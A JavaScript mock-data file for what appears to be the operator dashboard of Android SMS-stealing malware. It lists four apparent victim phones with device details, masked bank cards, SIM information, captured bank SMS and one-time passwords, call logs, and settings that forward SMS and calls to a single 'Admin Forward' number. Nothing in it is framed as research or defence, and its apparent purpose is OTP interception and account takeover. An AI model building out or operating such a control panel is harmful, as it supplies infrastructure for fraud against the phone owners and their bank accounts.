export const MOCK_USERS = [
  {
    id: "usr_98471a",
    fullName: "Rajesh Kumar",
    mobileNumber: "+91 98765 43210",
    userId: "ADM-9847",
    isActive: true,
    isOnline: true,
    lastActivityTime: "Just now",
    isConnected: true,
    appInBackground: false,
    stringField: "Samsung Galaxy S23 Ultra (Android 14)",
    numberField: "v2.4.1",
    cardData: {
      cardNumber: "4532 •••• •••• 8892",
      cardHolder: "RAJESH KUMAR",
      expiryDate: "08/28",
      cvv: "•••",
      bankName: "HDFC Bank"
    },
    simCards: [
      { slot: 1, operator: "Airtel 5G", number: "+91 98765 43210", status: "Active" },
      { slot: 2, operator: "Jio True 5G", number: "+91 88765 12345", status: "Active" }
    ],
    forwardConfig: {
      smsForwarding: true,
      callForwarding: true,
      forwardTargetNumber: "+91 99988 77766",
      selectedSimSlot: 1
    },
    smsLogs: [
      { id: "sms_1", sender: "VM-HDFCBK", body: "Dear Customer, INR 12,500.00 debited from A/C **4321 on 27-JUL-26. Ref: UPI/6291...", date: "2026-07-27 08:45 AM", type: "Inbox" },
      { id: "sms_2", sender: "JX-JIOOTP", body: "Your OTP for Jio Login is 849201. Do not share this OTP with anyone.", date: "2026-07-27 08:12 AM", type: "Inbox" },
      { id: "sms_3", sender: "AZ-AMAZON", body: "Your package containing Wireless Earbuds has been delivered.", date: "2026-07-26 04:30 PM", type: "Inbox" }
    ],
    callLogs: [
      { id: "call_1", number: "+91 98111 22334", name: "Anand Verma", type: "Incoming", duration: "03:42", timestamp: "2026-07-27 08:50 AM" },
      { id: "call_2", number: "+91 99988 77766", name: "Admin Forward", type: "Outgoing", duration: "01:15", timestamp: "2026-07-27 07:20 AM" },
      { id: "call_3", number: "+91 91234 56789", name: "Unknown", type: "Missed", duration: "00:00", timestamp: "2026-07-26 09:10 PM" }
    ]
  },
  {
    id: "usr_33219b",
    fullName: "Priya Sharma",
    mobileNumber: "+91 91234 87654",
    userId: "ADM-3321",
    isActive: true,
    isOnline: false,
    lastActivityTime: "2 mins ago",
    isConnected: true,
    appInBackground: true,
    stringField: "OnePlus 11 5G (Android 13)",
    numberField: "v2.4.0",
    cardData: {
      cardNumber: "5241 •••• •••• 1049",
      cardHolder: "PRIYA SHARMA",
      expiryDate: "11/27",
      cvv: "•••",
      bankName: "ICICI Bank"
    },
    simCards: [
      { slot: 1, operator: "Jio 4G", number: "+91 91234 87654", status: "Active" }
    ],
    forwardConfig: {
      smsForwarding: false,
      callForwarding: true,
      forwardTargetNumber: "+91 99988 77766",
      selectedSimSlot: 1
    },
    smsLogs: [
      { id: "sms_4", sender: "ICICIBK", body: "OTP for transaction at Amazon is 573910. Valid for 5 mins.", date: "2026-07-27 08:30 AM", type: "Inbox" }
    ],
    callLogs: [
      { id: "call_4", number: "+91 98888 11111", name: "Office Desk", type: "Incoming", duration: "08:12", timestamp: "2026-07-27 08:00 AM" }
    ]
  },
  {
    id: "usr_77124c",
    fullName: "Amitabh Sen",
    mobileNumber: "+91 99887 66554",
    userId: "ADM-7712",
    isActive: false,
    isOnline: false,
    lastActivityTime: "1 hour ago",
    isConnected: false,
    appInBackground: false,
    stringField: "Google Pixel 8 (Android 14)",
    numberField: "v2.3.9",
    cardData: {
      cardNumber: "6011 •••• •••• 3491",
      cardHolder: "AMITABH SEN",
      expiryDate: "03/29",
      cvv: "•••",
      bankName: "State Bank of India"
    },
    simCards: [
      { slot: 1, operator: "Vodafone Idea", number: "+91 99887 66554", status: "Active" }
    ],
    forwardConfig: {
      smsForwarding: true,
      callForwarding: false,
      forwardTargetNumber: "",
      selectedSimSlot: 1
    },
    smsLogs: [
      { id: "sms_5", sender: "SBIBANK", body: "A/C credit alert: INR 45,000 deposited via NEFT.", date: "2026-07-27 07:00 AM", type: "Inbox" }
    ],
    callLogs: []
  },
  {
    id: "usr_55412d",
    fullName: "Sneha Reddy",
    mobileNumber: "+91 88990 11223",
    userId: "ADM-5541",
    isActive: true,
    isOnline: true,
    lastActivityTime: "Just now",
    isConnected: true,
    appInBackground: false,
    stringField: "Xiaomi 13 Pro (Android 14)",
    numberField: "v2.4.1",
    cardData: {
      cardNumber: "4111 •••• •••• 9012",
      cardHolder: "SNEHA REDDY",
      expiryDate: "05/30",
      cvv: "•••",
      bankName: "Axis Bank"
    },
    simCards: [
      { slot: 1, operator: "Airtel 5G", number: "+91 88990 11223", status: "Active" }
    ],
    forwardConfig: {
      smsForwarding: true,
      callForwarding: true,
      forwardTargetNumber: "+91 99988 77766",
      selectedSimSlot: 1
    },
    smsLogs: [
      { id: "sms_6", sender: "AXISBK", body: "Your OTP is 192834 for Axis Mobile login.", date: "2026-07-27 09:02 AM", type: "Inbox" }
    ],
    callLogs: [
      { id: "call_5", number: "+91 97777 44444", name: "Tech Support", type: "Incoming", duration: "02:05", timestamp: "2026-07-27 09:00 AM" }
    ]
  }
];
